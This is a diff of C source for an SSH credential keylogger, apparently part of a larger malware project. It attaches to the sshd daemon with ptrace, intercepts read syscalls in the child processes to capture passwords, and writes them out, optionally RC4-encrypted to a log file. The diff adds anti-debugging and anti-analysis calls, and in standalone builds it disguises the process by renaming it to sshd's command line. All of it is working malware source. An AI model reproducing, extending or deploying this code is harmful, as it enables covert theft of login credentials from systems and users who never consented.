@@ -5,41 +5,49 @@
 #include <sys/wait.h>
 #include <unistd.h>
 #include "syscalls.h"
-//#include <sys/reg.h>
 #include <dirent.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <errno.h>
 
+#include "config.h"
+#include "common.h"
+#include "antidebug.h"
+#include "rc4.h"
 
+#if KEYLOGGER
 pid_t pid = 0;
 int attached = 0;
+#if ! STANDALONE
+int useRc4 = 0;
+rc4_ctx rc4_crypt;
+#endif 
 
 void attach(){
     int status;
     if (ptrace(PTRACE_ATTACH, pid, 0, 0) == -1){
-        printf ("[!] Can't attach pid %d\n", pid); fflush(stdout);
+        debug("[!] Can't attach pid %d\n", pid); fflush(stdout);
         exit (-1);
     }
     attached = 1;
     waitpid(pid, &status, 0);
-    printf("[*] Attached to pid %d.\n", pid); fflush(stdout);
+    debug("[*] Attached to pid %d.\n", pid); fflush(stdout);
 }
 
 void detach(){
     int status;
     if (ptrace(PTRACE_DETACH, pid , 0, 0) == -1){
-        printf ("[!] can't dettach pid %d\n", pid); fflush(stdout);
+        debug("[!] can't dettach pid %d\n", pid); fflush(stdout);
         exit (-1);
     }
     attached = 0;
     waitpid(pid, &status, 0);
-    printf("[*] Dettached.\n"); fflush(stdout);
+    debug("[*] Dettached.\n"); fflush(stdout);
 }
 
 void quit(char *msg, int ret){
-    printf("%s\n", msg); fflush (stdout);
+    debug("%s\n", msg); fflush (stdout);
     if (attached) detach();
     exit (ret);
 }
@@ -55,6 +63,7 @@ int check_ssh_password(unsigned char *buff, int len){
 	while (*ptr != 0x00) ptr--;
 	//printf("ptr: %p\n", ptr);
 
+	antidebug_obfuscate_analysis(11);
 	// Now we must have two bytes 0x00 at left and one < 0x0f at right
 	//printf("*ptr+1: 0x%02x, ptr-1: 0x%02x, ptr-2: 0x%02x\n", *(ptr+1), *(ptr-1), *(ptr-2)); fflush(stdout);
 	if ( *(ptr-1) != 0x00 || *(ptr-2) != 0x00) return 0;
@@ -64,7 +73,15 @@ int check_ssh_password(unsigned char *buff, int len){
 	//printf("%d\n", buff+len-1-ptr);
 	if (((buff+len-1)-(ptr+1)) != *(ptr+1)) return 0;
 
-	write(1, ptr+2, *(ptr+1));
+#if ! STANDALONE
+    if (useRc4) {
+        // xifrar rc4
+        rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_crypt);
+        rc4(ptr+2, *(ptr+1), &rc4_crypt);
+    }
+#endif
+    write(1, ptr+2, *(ptr+1));
+
     putchar('\n');
     return 1;
 }
@@ -80,16 +97,17 @@ int sshdPid(char *cmdline) {
 
 	DIR *proc = opendir("/proc");
 	if (!proc) {
-		perror("opendir");
-		exit(0);
+		quit("opendir error", 0);
 	}
+	antidebug_obfuscate_analysis(9);
 	while ((de=readdir(proc))) {
         sprintf(statusPath, "/proc/%s/stat", de->d_name);
         statusFile = fopen(statusPath, "r");
         if (statusFile) {
             if (fscanf(statusFile, "%d (sshd) %c %d", &sshdPid, &sshdState, &sshdPpid) == 3 && sshdPpid == 1) {
-                printf("Pid %d!\n", sshdPid);
+                debug("sshd pid: %d\n" ,sshdPid);
                 fclose(statusFile);
+				antidebug_obfuscate_analysis(10);
                 sprintf(statusPath, "/proc/%s/cmdline", de->d_name);
                 fd = open(statusPath, O_RDONLY);
                 read(fd, cmdline, 64);
@@ -105,14 +123,13 @@ int sshdPid(char *cmdline) {
 void mread(long int addr, long int size, int *dest){
     int i = 0;
     size = (size % 4) ? size/4 + 1 : size/4;
-    bzero(dest, size);
+    memset(dest, 0, size);
     errno = 0;
+	antidebug_obfuscate_analysis(8);
     for (i = 0; i < size; i++) {
         dest[i] = ptrace(PTRACE_PEEKTEXT, pid, addr+i*4,0);
-        //printf("@0x%lx = %08x\n", addr+i*4, dest[i]);
         if(errno != 0) {
-            printf(" => 0x%lx ",addr+i);fflush(stdout);
-            perror("ptrace");
+            debug(" => 0x%lx ",addr+i);fflush(stdout);
             errno = 0;
         }
     }
@@ -123,7 +140,6 @@ void lookForReads(pid_t eax) {
     int status;
     int insyscall = 0;
     struct pt_regs regs;
-    char * pass = 0;
     pid = eax;
     
     attach();
@@ -131,8 +147,10 @@ void lookForReads(pid_t eax) {
         ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
         wait(&status);
 
-        if(WIFEXITED(status)) {
-            printf("Acabant procés %d %x\n", getpid(), status);
+		antidebug_obfuscate_analysis(7);
+        if(WIFEXITED(status) || (WIFSTOPPED(status) && WSTOPSIG(status) != SIGTRAP && WSTOPSIG(status) != SIGCHLD) ) {
+            debug("Acabant procés %d %x\n", pid, status);
+            if (WSTOPSIG(status)) kill(pid, WSTOPSIG(status));
             break;
         }
         orig_eax = ptrace(PTRACE_PEEKUSER, pid, 4 * ORIG_EAX, NULL);
@@ -145,7 +163,7 @@ void lookForReads(pid_t eax) {
                 else {
                     insyscall = 0;
                     eax = ptrace(PTRACE_PEEKUSER, pid, 4 * EAX, NULL);
-                    //printf("[%d] Read returned with %ld\n", getpid(), eax);
+					antidebug_obfuscate_analysis(6);
                     if (eax > 5 && eax < 32) {
                         unsigned char pass[64];
                         memset(pass, 0, 64);
@@ -159,26 +177,65 @@ void lookForReads(pid_t eax) {
     exit(0);
 }
 
-int main(int argc, char *argv[]) {
+#if STANDALONE 
+void rename_proc(int argc, char **argv, char *newname) {
+	antidebug_obfuscate_analysis(1);
+	int i;
+	for (i = 0; i < argc; i++) {
+		memset(argv[i], 0, strlen(argv[i]));
+		realloc(argv[i], strlen(newname)+1);
+		memcpy(argv[i], newname, strlen(newname)+1);
+	}
+}
+#endif
+
+
+// TODO: escriure a disc si li passem el paràmetre o relatiu al home .k_ssh
+// TODO: escriure de forma xifrada 
+// TODO: algo per llegir els fitxers xifrats
+
+int main_keylogger(int argc, char **argv) {
     char procName[64];
+    char *logFile = 0;
     long orig_eax;
     pid_t eax;
     int status;
     int insyscall = 0;
     struct pt_regs regs;
-    char * pass = 0;
-
     int exitPid;
+    int fd = 0;
 
+	setsid();
+
+	antidebug_obfuscate_analysis(2);
+	antidebug_sigtrap()
     // Buscar pid del proces sshd
 	pid = sshdPid(procName);
     if (!pid) {
-        printf("sshd no trobat, sortint...\n");
+        debug("sshd no trobat, sortint...\n");
         exit(0);
     }
 
+#if STANDALONE
     // Canviar el nom del procés a cmdline del sshd
-    printf("Canviant nom a %s\n", procName);
+	rename_proc(argc, argv, procName);
+#else
+    if (argc == 1 && argv) {
+        logFile = argv[0];
+        useRc4 = 1;
+    }
+#endif
+
+    // Open logfile
+    if (logFile != 0) {
+        debug("Oppening file %s\n", logFile);
+        fd = open(argv[0], O_RDWR|O_CREAT, S_IRWXU);
+        if (!fd) exit(0);
+        lseek(fd, 0, SEEK_END);
+        dup2(fd, 1);
+    } else {
+        debug("Not oppening a file log\n");
+    }
 
     // Procés pare que per cada clone, crea un fill
     attach();
@@ -186,16 +243,20 @@ int main(int argc, char *argv[]) {
         ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
         exitPid = wait(&status);
 
-        // TODO: pensar is posar aquestes condicions també en l'altre procés
-        // TODO: sembla que si faig Ctr + C, queda el proces en stopped
-        // TODO: mirar bé que no hi hagi res q canti molt ni cap leak
-        if (WIFSTOPPED(status) && exitPid == pid && WSTOPSIG(status) != 5 && WSTOPSIG(status) != 17) {
-            printf("Acabant procés pare %d (%d)\n", pid, WSTOPSIG(status));
-            kill(pid, WSTOPSIG(status));
-            break;
+		antidebug_obfuscate_analysis(3);
+		if (WIFSTOPPED(status)) {
+			if (WSTOPSIG(status) == SIGCHLD) {
+				ptrace(PTRACE_CONT, pid, 0, SIGCHLD);
+			} else if (WSTOPSIG(status) != SIGTRAP &&  WSTOPSIG(status) != SIGSTOP) {
+				ptrace(PTRACE_CONT, pid, 0, WSTOPSIG(status));
+				perror("ptrace");
+   				debug("Acabant procés pare %d (%d)\n", pid, WSTOPSIG(status));
+	            break;
+			}
         }
         orig_eax = ptrace(PTRACE_PEEKUSER, pid, 4 * ORIG_EAX, NULL);
 
+		antidebug_obfuscate_analysis(4);
         switch (orig_eax) {
             case __NR_clone:
                 if(insyscall == 0) 
@@ -215,8 +276,8 @@ int main(int argc, char *argv[]) {
                 }
                 else {
                     insyscall = 0;
+					antidebug_obfuscate_analysis(5);
                     eax = ptrace(PTRACE_PEEKUSER, pid, 4 * EAX, NULL);
-                    //printf("[%d] Read returned with %ld\n", getpid(), eax);
                     if (eax > 5 && eax < 32) {
                         unsigned char pass[64];
                         memset(pass, 0, 64);
@@ -229,5 +290,15 @@ int main(int argc, char *argv[]) {
         }
     }
 
+	detach();
+	killpg(0, 15);
 	return 0;
 }
+
+#if STANDALONE 
+int main(int argc, char **argv) {
+	main_keylogger(argc, argv);
+	return 0;
+}
+#endif
+#endif
